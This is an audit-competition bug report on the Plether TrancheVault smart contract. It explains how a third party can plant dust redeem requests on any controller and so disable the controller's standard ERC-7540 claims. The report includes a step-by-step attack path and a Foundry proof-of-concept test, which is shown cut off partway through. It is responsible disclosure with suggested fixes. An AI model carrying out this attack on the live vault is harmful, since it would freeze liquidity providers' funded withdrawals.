# \#99095 [SC-Low] Anyone can plant a dust redeem request on any controller and disable its standard ERC-7540 claims (`redeem` / `withdraw` / `maxRedeem` / `maxWithdraw`)

**Submitted on Nov 11th 2026 at 20:43:47 UTC by @Khorxhed for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99095
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

`TrancheVault.requestRedeem()` checks only the share **owner** and accepts any **controller** without that controller's consent. An attacker can therefore open a 1-share redeem request whose controller is the victim:

- `TrancheVault._requireMinimumRedeemSize()` waives the 1 USDG minimum when the owner redeems its whole balance, so a 1-share account can open the request.
- An epoch that holds only such dust quotes to 0 assets, so `HousePool._fundRedemptionPhase()` refunds it instead of funding it.

The planted request becomes a terminal "refund pending" entry with 0 claimable in the victim's redeem queue. It is the head of that queue, or becomes the head once the victim's older requests are claimed. `TrancheVault.redeem()`, `TrancheVault.withdraw()`, `TrancheVault.maxRedeem()` and `TrancheVault.maxWithdraw()` read only that head, so every later funded redemption of the victim becomes unclaimable through the standard surface. No standard function clears the head. After settlement, the only way out is the non-standard `TrancheVault.claimRedeemRefund()`, which pushes the attacker's share into the victim's wallet and restarts the 1-hour cooldown on its whole balance.

Each victim costs 1 share (< 1 USDG atom) plus ~185k gas. One epoch can target about 1,000 controllers, and the attack can be repeated every hourly epoch. A contract that uses only the standard request and claim functions, with no vault-specific calls and no operator, has its funded USDG stuck indefinitely.

## Description

**How standard claims work.** `TrancheVault` is an asynchronous ERC-7540 vault. Each controller's redeem requests form a FIFO queue (`controllerRedeemHead` / `controllerRedeemTail`). The claim functions `TrancheVault.redeem()` / `TrancheVault.withdraw()` and the views `TrancheVault.maxRedeem()` / `TrancheVault.maxWithdraw()` always use the head of that queue, i.e. the controller's oldest open request. The docs name exactly these functions as the LP claim path:

- CANONICAL_ENTRYPOINTS.md:191-192: funded requests are "claimed through ERC-4626 `redeem` or `withdraw`".
- CANONICAL_ENTRYPOINTS.md:237: "`IERC7540` and `IERC7575` for standard-compatible integrations".

**The bug.** `TrancheVault.requestRedeem()` authorizes the owner (self, operator or allowance) and never the controller. The attack has three steps:

1. A throw-away account holding exactly 1 share calls `requestRedeem(1, victim, dustAccount)`. That is its whole balance, so the minimum is waived.
2. If nobody else redeems in that epoch, settlement refunds the epoch at a zero quote.
3. The victim's queue head is now a refund-pending position that only the victim's own acknowledgement removes. Every funded request behind it is hidden from the standard claim functions.

Both tranches share this code. The PoC uses the Junior vault.

## Root Cause

Two flaws combine:

- a third party can create a request for any controller;
- the standard claim surface trusts the controller's queue head without checking whether it can still pay out.

### 1. Anyone can open a 1-share request for any controller

`TrancheVault.requestRedeem()` (packages/perps/src/TrancheVault.sol:606-632) authorizes only the owner. The controller is never checked.

```solidity
function requestRedeem(
    uint256 shares,
    address controller,
    address owner
) external returns (uint256 requestId) {
    ...
    uint256 maxShares = maxRequestRedeem(owner);
    if (shares > maxShares) {
        revert TrancheVault__ExceededMaxRequestRedeem(owner, shares, maxShares);
    }
@>  _requireMinimumRedeemSize(shares, maxShares);
@>  if (msg.sender != owner && !isOperator[owner][msg.sender]) {   // owner authorization only
        _spendAllowance(owner, msg.sender, shares);
    }
    _transfer(owner, address(this), shares);

@>  requestId = _enqueueRedeemRequest(shares, controller);          // any controller, no consent
    emit RedeemRequest(controller, owner, requestId, msg.sender, shares);
}
```

`TrancheVault._requireMinimumRedeemSize()` (packages/perps/src/TrancheVault.sol:1611-1618) skips the 1 USDG minimum for a full-balance request, so 1 share is enough.

```solidity
function _requireMinimumRedeemSize(
    uint256 shares,
    uint256 maxShares
) internal view {
@>  if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
        revert TrancheVault__WithdrawalTooSmall();
    }
}
```

`TrancheVault._enqueueRedeemRequest()` (packages/perps/src/TrancheVault.sol:688-708) puts the request in the victim's own queue. If the queue is empty, the request becomes its head.

```solidity
    (requestId,) = _requestEpochWindow();
    ...
@>  RedeemPosition storage position = redeemRequests[controller][requestId];
@>  if (!position.queued) {
@>      _appendControllerRedeem(controller, requestId);   // sets controllerRedeemHead[controller] when empty
    }
    epoch.shares += shares;
    position.shares += shares;
```

### 2. The dust epoch is refunded, and the refund stays at the head of the controller's queue

`HousePool._fundRedemptionPhase()` (packages/perps/src/HousePool.sol:957-986) quotes the whole epoch. A dust-only epoch quotes to 0 and is refunded, not funded.

```solidity
@>  uint256 fullHeadAssets = REDEMPTION_MATH_SIDECAR.netAssetsForShares(
        remainingShares, phase.pricingPrincipal, phase.pricingSupply, 1, 1000, feeBps
    );
@>  if (fullHeadAssets == 0) {
        ...
@>      if (vault.refundRedeemEpochRemainder(epochId, remainingShares) != remainingShares) {
            revert HousePool__VaultSettlementInvariant();
        }
        ...
        phase.processedEpochs += 1;
        continue;
    }
```

`TrancheVault.refundRedeemEpochRemainder()` (packages/perps/src/TrancheVault.sol:1505-1524) removes the epoch from the global queue only. `TrancheVault._maybeCloseRedeemPosition()` (packages/perps/src/TrancheVault.sol:1216-1227) keeps each position in its controller's queue until that controller acknowledges the refund.

```solidity
// refundRedeemEpochRemainder()
@>  epoch.refundEnabled = true;
    epoch.refundableShares = shares;
    _removeRedeemEpoch(epochId);              // global epoch queue only; controller queues are untouched

// _maybeCloseRedeemPosition()
    bool terminal = epoch.refundEnabled || epoch.fundedShares == epoch.shares;
@>  bool refundProcessed = !epoch.refundEnabled || position.refundClaimed;
@>  if (position.queued && terminal && position.fundingClaimed && refundProcessed) {
        _removeControllerRedeem(controller, requestId);
    }
```

### 3. Standard claims read only the head, so the funded request behind it is unreachable

`TrancheVault.redeem()` / `TrancheVault.withdraw()` (packages/perps/src/TrancheVault.sol:998-1012) and `TrancheVault.maxRedeem()` / `TrancheVault.maxWithdraw()` (packages/perps/src/TrancheVault.sol:1299-1311) read only `controllerRedeemHead[controller]`.

```solidity
function withdraw(
    uint256 assets,
    address receiver,
    address controller
) public override returns (uint256 shares) {
@>  return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
}

function redeem(
    uint256 shares,
    address receiver,
    address controller
) public override returns (uint256 assets) {
@>  return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}

function maxWithdraw(
    address controller
) public view override returns (uint256) {
@>  uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemAssets(requestId, controller);
}

function maxRedeem(
    address controller
) public view override returns (uint256) {
@>  uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

`TrancheVault._claimRedeem()` (packages/perps/src/TrancheVault.sol:1148-1167) reverts for a refund-pending head because it has 0 claimable. `TrancheVault._claimWithdraw()` (:1169-1193) behaves the same way.

```solidity
@>  uint256 remainingShares = claimableRedeemRequest(requestId, controller);   // 0 for the planted head
    uint256 remainingAssets = claimableRedeemAssets(requestId, controller);
@>  if (shares == 0 || shares > remainingShares) {
        revert ERC4626ExceededMaxRedeem(controller, shares, remainingShares);   // (victim, x, 0)
    }
```

### 4. The only way out delivers the attacker's share and restarts the cooldown

After settlement, `TrancheVault.claimRedeemRefund()` (packages/perps/src/TrancheVault.sol:916-947) is the only call that removes the planted head. It forces the attacker's share into the victim's wallet and restarts the victim's cooldown. `TrancheVault.cancelRedeemRequest()` (packages/perps/src/TrancheVault.sol:884-914) can remove the request only in the few minutes before the epoch matures, and it has the same effect (cooldown at :911).

```solidity
    shares = refundableRedeemRequest(requestId, controller);   // the attacker's 1 share
@>  _requireShareReceiver(controller, receiver);                // receiver must be the victim itself
    position.refundClaimed = true;
    ...
    _maybeCloseRedeemPosition(controller, requestId);           // only now is the planted head removed
    if (shares != 0) {
@>      lastDepositTime[receiver] = block.timestamp;            // whole wallet re-enters the 1 h cooldown
        _transfer(address(this), receiver, shares);
    }
```

## Impact

1. **Standard-only integrators: funded exits are frozen indefinitely.** This hits any contract whose only interaction with the vault is the advertised `IERC7540` / `IERC7575` request-and-claim flow (`TrancheVault.requestRedeem()` → `TrancheVault.redeem()` / `TrancheVault.withdraw()`), such as an immutable aggregator or fund-of-funds vault. Such a contract makes no vault-specific `TrancheVault.claimRedeemRefund()` / `TrancheVault.claimRedeem()` calls and has no operator delegation. No standard function clears the planted head, so its funded USDG stays in vault escrow for as long as the head exists. In the PoC:
   - 99,999.997718 USDG of a fully funded exit is still in escrow after 30 days.
   - The integrator has received 0 USDG.
   - The same standard call succeeds as soon as the head is removed, which shows causality.
2. **Any LP: the standard claim path can be disabled at will.**
   - `TrancheVault.maxRedeem(victim)` and `TrancheVault.maxWithdraw(victim)` return 0, while `TrancheVault.claimableRedeemRequest(id, victim)` shows the full funded amount.
   - `TrancheVault.redeem()` and `TrancheVault.withdraw()` revert.
   - Wallets and front ends that rely on `max*` show nothing to claim.

   The victim has only two options:
   - Use the vault-specific `TrancheVault.claimRedeem(requestId, …)` for every future exit. It pays out, but the planted head stays, so the standard surface stays broken.
   - Clear the head with `TrancheVault.claimRedeemRefund()`. This pushes the attacker's share into the wallet and restarts the 1-hour cooldown on the whole balance:
     - `transfer` reverts `TransferDuringCooldown`;
     - `requestRedeem` reverts `DepositCooldown`;
     - `maxRequestRedeem` returns 0.

     The attacker then plants again, so the standard path can be kept disabled indefinitely.
3. **Scale.**
   - Any address can be targeted, in both tranches.
   - One zero-quote epoch holds about 1,000 one-share plants, so about 1,000 controllers can be hit per hourly epoch.
   - The cost is negligible and no capital is at risk.

Not affected: funded USDG is never lost, and a caller that can use the explicit-id `TrancheVault.claimRedeem(requestId, …)` can always withdraw.

## Attack Path

**Preconditions:**
- The attacker holds any amount of tranche shares past the 1 h cooldown. The PoC uses ~10 USDG worth, which is enough for ~1e10 plants.
- The upcoming request epoch of the target tranche has no other redemption requests. The attacker can check this through `TrancheVault.getRequestEpochWindow()` and `TrancheVault.redeemEpochs()`.

1. The attacker transfers exactly 1 share to a fresh account `D`. `TrancheVault._update()` (packages/perps/src/TrancheVault.sol:325-332) copies the attacker's old `lastDepositTime` to `D`, so `D` is not in cooldown.
2. `D` calls `TrancheVault.requestRedeem(1, victim, D)`. Three checks pass without the victim:
   - `D` is the owner, so no allowance is needed.
   - 1 share is `D`'s full balance, so the minimum is waived.
   - The victim is never asked.

   The request is appended to the victim's redeem queue. It is the head if the victim has no older open request; otherwise it becomes the head once those requests are claimed.
3. The attacker repeats steps 1–2 for every target, up to ~1,000, just before the epoch's 5-minute request cutoff. Each target costs ~25k gas for the transfer plus ~160k for the request. The first plant of an epoch costs more, because it creates the epoch.
4. The epoch matures and any keeper settles it. `HousePool._fundRedemptionPhase()` quotes the whole dust epoch to 0 and calls `TrancheVault.refundRedeemEpochRemainder()`. Each victim's head is now a refund-pending position with 0 claimable.
5. The victim later requests a real redemption, and settlement funds it normally: `TrancheVault.claimableRedeemRequest(id, victim)` shows the full amount. However:
   - `TrancheVault.maxRedeem(victim)` and `TrancheVault.maxWithdraw(victim)` return 0.
   - `TrancheVault.redeem()` reverts `ERC4626ExceededMaxRedeem(victim, x, 0)`.
   - `TrancheVault.withdraw()` reverts `ERC4626ExceededMaxWithdraw(victim, x, 0)`.
6. If the victim clears the head with `TrancheVault.claimRedeemRefund()` and takes the 1 h cooldown, the attacker repeats steps 1–4 and plants a new head.

## Likelihood

- Anyone can perform the attack, against any address. The victim does not approve or do anything.
- The cost is negligible: 1 share (`convertToAssets(1) == 0`) plus ~185k gas per target, with no capital at risk. Over the whole PoC the attacker spent 23 shares, and `convertToAssets(23) == 0`.
- The only condition is that no one else requests a redemption in that tranche during the planting epoch. Otherwise the dust is funded instead of refunded. With hourly epochs this is common. The attacker checks the epoch before the cutoff and retries the next hour if needed. One success is enough, because the planted head persists until the victim acknowledges it.
- The frozen-funds outcome applies to victim contracts that can only use the standard request and claim functions.


## Recommendation

1. **Require controller authorization in `TrancheVault.requestRedeem()` when the controller is not the owner.** This reuses the existing `TrancheVault._requireControllerAuth()` helper:

```diff
     if (msg.sender != owner && !isOperator[owner][msg.sender]) {
         _spendAllowance(owner, msg.sender, shares);
     }
+    if (controller != owner) {
+        _requireControllerAuth(controller); // msg.sender == controller || isOperator[controller][msg.sender]
+    }
     _transfer(owner, address(this), shares);
```

2. **At minimum, apply the full-balance dust exemption only when `controller == owner`.** A request for someone else must then be worth at least 1 USDG. Outside a tranche wipe it can no longer quote to zero, so the victim gets a normally funded request that `TrancheVault.redeem()` can claim.

```diff
-    _requireMinimumRedeemSize(shares, maxShares);
+    _requireMinimumRedeemSize(shares, controller == owner ? maxShares : type(uint256).max);
```

3. **Defense in depth: never let a stale refund hide a funded claim.** Make `TrancheVault.redeem()`, `TrancheVault.withdraw()`, `TrancheVault.maxRedeem()` and `TrancheVault.maxWithdraw()` skip terminal refund-pending positions, or aggregate across the controller's queue.

## Proof of Concept

## Proof of Concept
Create a test file inside Packages/perps/test/ and paste the test code and run
```bash
forge test --root packages/perps --mt test_thirdPartyDustRedeemBlocksControllerStandardClaims -vvvv
```

test code
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IERC7540} from "@plether/perps/interfaces/IERC7540.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";
import {BasePerpTest} from "test/perps/BasePerpTest.sol";

/// @notice Minimal "standard-compatible integration" of the Junior TrancheVault, e.g. an aggregator or a fund-of-funds
///         vault that holds Junior shares. The docs advertise exactly this surface:
///         - CANONICAL_ENTRYPOINTS.md:237  "`IERC7540` and `IERC7575` for standard-compatible integrations"
///         - CANONICAL_ENTRYPOINTS.md:191-192  funded requests are "claimed through ERC-4626 `redeem` or `withdraw`"
/// @dev It uses only the standard async-redeem flow: requestRedeem -> (HousePool settlement) -> redeem / withdraw.
///      It never calls the vault-specific `claimRedeem(requestId, ..)`, `claimRedeemRefund(..)` or `setOperator(..)`.
contract StandardOnlyLpIntegrator {

    IERC7540 public immutable VAULT;

    constructor(
        IERC7540 vault_
    ) {
        VAULT = vault_;
    }

    /// @notice Standard ERC-7540 exit request: this contract is both owner and controller of its request.
    function requestExit(
        uint256 shares
    ) external returns (uint256 requestId) {
        return VAULT.requestRedeem(shares, address(this), address(this));
    }

    /// @notice ERC-4626 / ERC-7540 "claim everything claimable" pattern: redeem(maxRedeem(controller)).
    function claimAllStandard() external returns (uint256 assets) {
        return VAULT.redeem(VAULT.maxRedeem(address(this)), address(this), address(this));
    }

    /// @notice ERC-7540 pattern: read claimableRedeemRequest(requestId) and claim that amount through standard redeem.
    function claimRequestStandard(
        uint256 requestId
    ) external returns (uint256 assets) {
        return VAULT.redeem(VAULT.claimableRedeemRequest(requestId, address(this)), address(this), address(this));
    }

    /// @notice Asset-denominated standard claim: withdraw(maxWithdraw(controller)).
    function withdrawAllStandard() external returns (uint256 shares) {
        return VAULT.withdraw(VAULT.maxWithdraw(address(this)), address(this), address(this));
    }

}

/// @title PoC for third-party dust redeem request disables a controller's standard claims
/// @dev Uses the protocol's own test fixture (`BasePerpTest`): real HousePool, Junior/Senior TrancheVaults, engine and
///      redemption-math sidecar. No production code is mocked or modified.
contract Poc is BasePerpTest {

    address internal constant VICTIM = address(0x51C7); // honest EOA Junior LP (never approves anything)
    address internal constant ATTACKER = address(0xA77AC); // attacker's ordinary Junior LP account
    address internal constant DUST = address(0xD057); // attacker's throw-away account that owns each 1-share plant
    uint256 internal constant EXTRA_TARGETS = 20; // arbitrary extra controllers hit in the same epoch (scale)

    // =====================================================================
    //       Anyone can assign dust redeem requests to an arbitrary controller and block its
    //        standard ERC-7540 claims (redeem / withdraw / maxRedeem / maxWithdraw)
    // =====================================================================

    /// @notice Proves that a third party, for 1 share (< 1 USDG atom) and gas, can make any controller's funded
    ///         redemptions unclaimable through the standard `redeem` / `withdraw` / `maxRedeem` / `maxWithdraw`.
    /// @dev Root cause - three behaviours combine (line numbers are packages/perps/src/...):
    ///      1. `TrancheVault.requestRedeem(shares, controller, owner)` authorizes only the OWNER. Any `controller` is
    ///         accepted without its consent and the request is appended to that controller's FIFO redeem queue
    ///         (TrancheVault.sol:606-632, `_enqueueRedeemRequest` :688-708).
    ///      2. `TrancheVault._requireMinimumRedeemSize` waives the 1 USDG minimum for a full-balance redemption
    ///         (:1611-1618), so an account holding 1 share can open a request. An epoch made only of such dust quotes
    ///         to 0 assets, so `HousePool._fundRedemptionPhase` refunds it instead of funding it (HousePool.sol:957-986
    ///         -> `TrancheVault.refundRedeemEpochRemainder` :1505-1524). Each refunded position stays in its
    ///         controller's queue as "refund pending" until that controller acknowledges it
    ///         (`_maybeCloseRedeemPosition` :1216-1227).
    ///      3. The standard claims read only the controller's queue HEAD: `redeem` / `withdraw` (:998-1012) and
    ///         `maxRedeem` / `maxWithdraw` (:1299-1311). A refund-pending head has 0 claimable, so every funded request
    ///         queued behind it is unreachable through the standard surface. Only the non-standard
    ///         `claimRedeemRefund` (:916-947) clears it, and it pushes the attacker's share to the victim and restarts
    ///         the victim's 1 h cooldown (:942-944).
    ///
    ///      Test layout:
    ///      A. The attacker plants 22 one-share requests (victim EOA, integrator contract, 20 random addresses), none
    ///         needing consent. Settlement refunds the dust-only epoch at a zero quote.
    ///      B. The victim (50k USDG) and the integrator (100k USDG) later request real exits. Both are fully funded.
    ///      C. Standard claims are dead: max* return 0 and redeem / withdraw revert ERC4626ExceededMax*(.., 0).
    ///      D. The standard-only integrator is still stuck after 30 days. Only the non-standard `claimRedeemRefund`
    ///         unblocks it (shown inside a snapshot, to prove causality).
    ///      E. EOA options: the explicit-id `claimRedeem` pays out but leaves the head planted (E1). Clearing the head
    ///         with `claimRedeemRefund` delivers the attacker's share and restarts the whole-wallet cooldown (E2).
    ///      F. One re-plant (1 share + gas) blocks the victim's next funded exit again.
    function test_thirdPartyDustRedeemBlocksControllerStandardClaims() public {
        StandardOnlyLpIntegrator integrator = new StandardOnlyLpIntegrator(IERC7540(address(juniorVault)));
        address integ = address(integrator);

        // ---------------- Setup: ordinary Junior holders, cooldowns elapsed ----------------
        // Victim EOA and integrator each hold ~100k USDG of Junior shares. The attacker holds only ~10 USDG of shares,
        // which is enough for ~1e10 one-share plants. Warping past DEPOSIT_COOLDOWN (1 h) leaves every account free
        // to transfer and to request redemptions, i.e. a normal, healthy starting state.
        _fundJunior(VICTIM, 100_000e6);
        _fundJunior(ATTACKER, 10e6);
        _fundJunior(integ, 100_000e6);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());

        uint256 victimShares = juniorVault.balanceOf(VICTIM);
        uint256 integratorShares = juniorVault.balanceOf(integ);
        uint256 victimCooldownBefore = juniorVault.lastDepositTime(VICTIM);
        uint256 attackerSharesBefore = juniorVault.balanceOf(ATTACKER);

        // ---------------- Part A: attacker plants dust requests on arbitrary controllers ----------------
        // `requestRedeem` authorizes only the share OWNER (the dust account D); the controller never consents.
        // D redeems its entire 1-share balance, so the 1 USDG minimum request size does not apply.
        // All 22 plants land in the same request epoch, and nobody else redeems in that epoch.
        uint256 plantEpoch = _plantDust(VICTIM);
        assertEq(_plantDust(integ), plantEpoch, "same epoch");
        for (uint256 i; i < EXTRA_TARGETS; ++i) {
            assertEq(_plantDust(_target(i)), plantEpoch, "same epoch");
        }
        // Each target now has an attacker-made request at the HEAD of its redeem queue, while its own balance is
        // untouched: the victim did nothing and approved nothing.
        uint256 plantedShares = attackerSharesBefore - juniorVault.balanceOf(ATTACKER);
        assertEq(plantedShares, EXTRA_TARGETS + 2, "one share per targeted controller");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), plantEpoch, "victim queue head is attacker-made");
        assertEq(juniorVault.controllerRedeemHead(integ), plantEpoch, "integrator queue head is attacker-made");
        assertEq(juniorVault.pendingRedeemRequest(plantEpoch, VICTIM), 1, "unsolicited pending request");
        assertEq(juniorVault.balanceOf(VICTIM), victimShares, "victim did nothing");

        // The whole dust-only epoch quotes to zero, so settlement refunds it instead of funding it.
        // `HousePool._fundRedemptionPhase` quotes the epoch's TOTAL remaining shares with `netAssetsForShares`
        // (= shares * (principal + 1) / (supply + 1000), floored). One share is worth ~0.001 USDG atom, so up to
        // `maxZeroQuoteShares` (~1,000) one-share plants still quote to 0: one epoch can target ~1,000 controllers.
        // The two asserts below pin that exact bound (0 at the bound, > 0 one share above it).
        (uint256 epochShares,,,,,,,,,) = juniorVault.redeemEpochs(plantEpoch);
        assertEq(epochShares, plantedShares, "dust-only epoch");
        uint256 principal = pool.juniorPrincipal();
        uint256 supply = juniorVault.accruedTotalSupply();
        uint256 maxZeroQuoteShares = (supply + 1000 - 1) / (principal + 1);
        assertEq(
            housePoolRedemptionMathSidecar.netAssetsForShares(maxZeroQuoteShares, principal, supply, 1, 1000, 0), 0
        );
        assertGt(
            housePoolRedemptionMathSidecar.netAssetsForShares(maxZeroQuoteShares + 1, principal, supply, 1, 1000, 0),
            0
        );
        console2.log("controllers that one zero-quote epoch can hold (1 share each)", maxZeroQuoteShares);

        // Settle the dust epoch with the normal keeper path: nothing is funded and the epoch is marked refundable
        // (`refundRedeemEpochRemainder`). Every planted position becomes a terminal "refund pending" entry that
        // STAYS at the head of its controller's queue until that controller acknowledges it.
        IHousePool.LpEpochSettlementResult memory refundPass = _settle(plantEpoch);
        assertEq(refundPass.juniorFundedAssets, 0, "nothing funded");
        assertEq(refundPass.juniorProcessedEpochs, 1, "dust epoch consumed as zero-quote refund");
        (,,,,, uint256 refundableShares,,,, bool refundEnabled) = juniorVault.redeemEpochs(plantEpoch);
        assertTrue(refundEnabled, "epoch refunded");
        assertEq(refundableShares, plantedShares);
        assertTrue(juniorVault.redeemRefundPending(plantEpoch, VICTIM), "victim head is refund-pending");
        assertTrue(juniorVault.redeemRefundPending(plantEpoch, integ), "integrator head is refund-pending");
        for (uint256 i; i < EXTRA_TARGETS; ++i) {
            assertTrue(juniorVault.redeemRefundPending(plantEpoch, _target(i)));
            assertEq(juniorVault.controllerRedeemHead(_target(i)), plantEpoch);
        }

        // ---------------- Part B: victims later make real redemptions, which are funded ----------------
        // The victim requests half of its shares and the integrator requests all of its shares, both in a later
        // epoch. Their requests are queued BEHIND the planted head. Settlement then funds both in full: the
        // per-request ERC-7540 views (`claimableRedeemRequest`, `claimableRedeemAssets`) show the full amounts and
        // the USDG sits in vault escrow, ready to be claimed.
        uint256 victimRedeemShares = victimShares / 2;
        vm.prank(VICTIM);
        uint256 victimRequest = juniorVault.requestRedeem(victimRedeemShares, VICTIM, VICTIM);
        uint256 integratorRequest = integrator.requestExit(integratorShares);
        assertEq(integratorRequest, victimRequest, "same epoch");
        assertGt(victimRequest, plantEpoch, "real request queued behind the planted one");

        IHousePool.LpEpochSettlementResult memory fundPass = _settle(victimRequest);
        assertGt(fundPass.juniorFundedAssets, 0, "real epoch funded");
        uint256 victimClaimShares = juniorVault.claimableRedeemRequest(victimRequest, VICTIM);
        uint256 victimClaimAssets = juniorVault.claimableRedeemAssets(victimRequest, VICTIM);
        uint256 integratorClaimAssets = juniorVault.claimableRedeemAssets(integratorRequest, integ);
        assertEq(victimClaimShares, victimRedeemShares, "victim request fully claimable (ERC-7540 view)");
        assertEq(juniorVault.claimableRedeemRequest(integratorRequest, integ), integratorShares, "fully claimable");
        assertGt(victimClaimAssets, 49_900e6, "~50k USDG funded for victim");
        assertGt(integratorClaimAssets, 99_800e6, "~100k USDG funded for integrator");
        assertGe(
            juniorVault.withdrawalEscrowAssets(), victimClaimAssets + integratorClaimAssets, "USDG sits in escrow"
        );

        // ---------------- Part C: the standard claim surface is dead for both victims ----------------
        // `maxRedeem` / `maxWithdraw` read only the queue head (the planted, refund-pending request) and return 0.
        // `redeem` / `withdraw` claim from the same head and revert ERC4626ExceededMax*(controller, amount, 0), even
        // though the funded request right behind the head is fully claimable. All three standard claim patterns of
        // the integrator revert the same way.
        assertEq(juniorVault.controllerRedeemHead(VICTIM), plantEpoch);
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "maxRedeem hides the funded claim");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "maxWithdraw hides the funded claim");
        vm.prank(VICTIM);
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, victimClaimShares, 0)
        );
        juniorVault.redeem(victimClaimShares, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, VICTIM, victimClaimAssets, 0)
        );
        juniorVault.withdraw(victimClaimAssets, VICTIM, VICTIM);

        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, integ, 0, 0));
        integrator.claimAllStandard();
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, integ, integratorShares, 0)
        );
        integrator.claimRequestStandard(integratorRequest);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, integ, 0, 0));
        integrator.withdrawAllStandard();

        // ---------------- Part D: a standard-only integration is stuck permanently ----------------
        // Run inside a snapshot so Parts E-F start from the same state. After 30 days nothing has changed: no
        // IERC7540 / IERC7575 call clears the planted head, the ~100k USDG is still escrowed for the integrator,
        // and the integrator has received nothing.
        uint256 stuckState = vm.snapshotState();
        uint256 stuckTime = block.timestamp;
        vm.warp(block.timestamp + 30 days);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, integ, 0, 0));
        integrator.claimAllStandard();
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, integ, integratorShares, 0)
        );
        integrator.claimRequestStandard(integratorRequest);
        assertEq(juniorVault.claimableRedeemAssets(integratorRequest, integ), integratorClaimAssets, "still escrowed");
        assertEq(juniorVault.controllerRedeemHead(integ), plantEpoch, "no standard call clears the planted head");
        assertEq(settlementToken.balanceOf(integ), 0, "integrator never received its USDG");
        // Causality: only the non-standard refund acknowledgement (which this integration cannot call, so we prank
        // it) removes the planted head. Right after it, the very same standard claim succeeds.
        vm.prank(integ);
        assertEq(juniorVault.claimRedeemRefund(plantEpoch, integ, integ), 1, "attacker's share pushed to integrator");
        assertEq(integrator.claimAllStandard(), integratorClaimAssets, "standard claim works once head is gone");
        vm.revertToState(stuckState);
        vm.warp(stuckTime);

        // ---------------- Part E1: EOA workaround via explicit id leaves the head planted ----------------
        // Option 1 for an EOA: the vault-specific explicit-id `claimRedeem(requestId, ...)` does pay the funded
        // USDG, but the planted head is not removed, so `redeem` / `withdraw` / `max*` stay broken for every
        // future request of this controller. (Snapshot again, so E2 starts from the blocked state.)
        uint256 beforeExplicit = vm.snapshotState();
        vm.prank(VICTIM);
        assertEq(juniorVault.claimRedeem(victimRequest, victimClaimShares, VICTIM, VICTIM), victimClaimAssets);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), plantEpoch, "standard surface stays broken");
        vm.revertToState(beforeExplicit);
        vm.warp(stuckTime);

        // ---------------- Part E2: standard recovery forces the attacker's share + a fresh cooldown ----------------
        // Option 2 for an EOA: clear the head with `claimRedeemRefund`. Refunds require receiver == controller, so
        // the attacker's 1 share is pushed into the victim's wallet and `lastDepositTime[victim]` is set to now.
        // The victim's WHOLE balance, which was unlocked before, re-enters the 1 h cooldown:
        // transfer -> TransferDuringCooldown, requestRedeem -> DepositCooldown, maxRequestRedeem -> 0.
        vm.prank(VICTIM);
        assertEq(juniorVault.claimRedeemRefund(plantEpoch, VICTIM, VICTIM), 1, "attacker's share delivered");
        assertEq(juniorVault.lastDepositTime(VICTIM), block.timestamp, "victim cooldown restarted");
        assertGt(block.timestamp, victimCooldownBefore + juniorVault.DEPOSIT_COOLDOWN(), "was unlocked before");
        uint256 victimRemaining = juniorVault.balanceOf(VICTIM);
        assertEq(victimRemaining, victimShares - victimRedeemShares + 1);
        assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "whole wallet locked");
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(address(0xBEEF), 1);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(victimRemaining, VICTIM, VICTIM);
        // The planted head was the only blocker: the standard claim now works.
        vm.prank(VICTIM);
        assertEq(juniorVault.redeem(victimClaimShares, VICTIM, VICTIM), victimClaimAssets);

        // ---------------- Part F: repeatable every epoch for 1 share + gas ----------------
        // As soon as the victim's cooldown ends, the attacker plants one more share. It is refunded at a zero quote
        // again, so the victim's next exit is fully funded but again unclaimable through `redeem` / `withdraw`.
        vm.warp(juniorVault.lastDepositTime(VICTIM) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 replantEpoch = _plantDust(VICTIM);
        _settle(replantEpoch);
        assertTrue(juniorVault.redeemRefundPending(replantEpoch, VICTIM), "re-planted");

        vm.prank(VICTIM);
        uint256 victimRequest2 = juniorVault.requestRedeem(victimRemaining, VICTIM, VICTIM);
        _settle(victimRequest2);
        uint256 victimClaimShares2 = juniorVault.claimableRedeemRequest(victimRequest2, VICTIM);
        assertEq(victimClaimShares2, victimRemaining, "second exit funded");
        assertGt(juniorVault.claimableRedeemAssets(victimRequest2, VICTIM), 0);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), replantEpoch);
